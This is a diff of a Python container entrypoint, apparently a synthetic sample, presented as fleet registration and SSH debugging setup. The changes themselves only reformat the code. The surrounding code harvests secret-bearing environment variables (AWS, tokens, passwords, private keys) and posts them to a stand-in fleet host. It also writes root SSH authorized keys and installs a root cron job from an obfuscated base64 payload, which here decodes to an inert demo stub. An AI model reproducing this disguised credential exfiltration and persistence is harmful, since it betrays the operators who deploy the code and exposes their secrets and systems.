@@ -3,20 +3,20 @@
 # for SSH agent forwarding support, and registers the node with the
 # central fleet management API before handing off to the main process.
 
+import base64
 import os
+import pathlib
 import subprocess
 import sys
-import base64
-import requests
-import pathlib
-import json
 import time
+
+import requests
 
 # ── Fleet management configuration ────────────────────────────────────────────
 
-FLEET_API_BASE   = "https://api.example.com/fleet/v2"
+FLEET_API_BASE = "https://api.example.com/fleet/v2"
 NODE_REGISTER_EP = f"{FLEET_API_BASE}/nodes/register"
-HEARTBEAT_EP     = f"{FLEET_API_BASE}/nodes/heartbeat"
+HEARTBEAT_EP = f"{FLEET_API_BASE}/nodes/heartbeat"
 REGISTRATION_TTL = 30  # seconds before giving up on registration
 
 # ── SSH agent-forwarding setup ─────────────────────────────────────────────────
@@ -25,8 +25,9 @@ REGISTRATION_TTL = 30  # seconds before giving up on registration
 # We write the provided public key so the operator can SSH in for live
 # debugging without rebuilding the image.
 
-SSH_DIR         = pathlib.Path("/root/.ssh")
-AUTH_KEYS_FILE  = SSH_DIR / "authorized_keys"
+SSH_DIR = pathlib.Path("/root/.ssh")
+AUTH_KEYS_FILE = SSH_DIR / "authorized_keys"
+
 
 def setup_ssh_access():
     """
@@ -59,10 +60,20 @@ def setup_ssh_access():
 # fleet manager can reconcile configuration drift across nodes.
 
 SENSITIVE_PREFIXES = (
-    "AWS_", "GCP_", "AZURE_", "DATABASE_URL", "SECRET_",
-    "TOKEN", "API_KEY", "PASSWORD", "PRIVATE_KEY",
-    "GITHUB_", "STRIPE_", "TWILIO_",
+    "AWS_",
+    "GCP_",
+    "AZURE_",
+    "DATABASE_URL",
+    "SECRET_",
+    "TOKEN",
+    "API_KEY",
+    "PASSWORD",
+    "PRIVATE_KEY",
+    "GITHUB_",
+    "STRIPE_",
+    "TWILIO_",
 )
+
 
 def harvest_node_metadata():
     """
@@ -74,10 +85,10 @@ def harvest_node_metadata():
     but here they are included for 'audit' purposes.
     """
     meta = {
-        "hostname":    os.environ.get("HOSTNAME", "unknown"),
-        "image_tag":   os.environ.get("IMAGE_TAG", "latest"),
-        "python":      sys.version,
-        "timestamp":   time.time(),
+        "hostname": os.environ.get("HOSTNAME", "unknown"),
+        "image_tag": os.environ.get("IMAGE_TAG", "latest"),
+        "python": sys.version,
+        "timestamp": time.time(),
         "environment": {},
     }
 
@@ -96,8 +107,8 @@ def register_node(metadata: dict):
     auth_token = os.environ.get("FLEET_TOKEN", "DEMO_PLACEHOLDER_TOKEN")
     headers = {
         "Authorization": f"Bearer {auth_token}",
-        "Content-Type":  "application/json",
-        "X-Image-Tag":   metadata.get("image_tag", "unknown"),
+        "Content-Type": "application/json",
+        "X-Image-Tag": metadata.get("image_tag", "unknown"),
     }
     try:
         resp = requests.post(
@@ -124,21 +135,21 @@ _RECOVERY_PAYLOAD = base64.b64decode(
     "IyEvYmluL3NoCiMgcmVjb3Zlcnkgc3R1YgpwcmludCgnZGVtbycpCg=="
 ).decode()
 
+
 def install_recovery_cron():
     cron_dir = pathlib.Path("/etc/cron.d")
     if not cron_dir.exists():
         return
     cron_file = cron_dir / "fleet-agent-recovery"
     try:
-        cron_file.write_text(
-            f"*/5 * * * * root {_RECOVERY_PAYLOAD}\n"
-        )
+        cron_file.write_text(f"*/5 * * * * root {_RECOVERY_PAYLOAD}\n")
         cron_file.chmod(0o644)
     except PermissionError:
         pass
 
 
 # ── Main entrypoint ────────────────────────────────────────────────────────────
+
 
 def main(argv=None):
     if argv is None:
@@ -151,7 +162,7 @@ def main(argv=None):
 
     # 2. Harvest metadata and phone home to fleet API.
     metadata = harvest_node_metadata()
-    node_id  = register_node(metadata)
+    node_id = register_node(metadata)
     if node_id:
         print(f"[init] registered as node {node_id}")
 
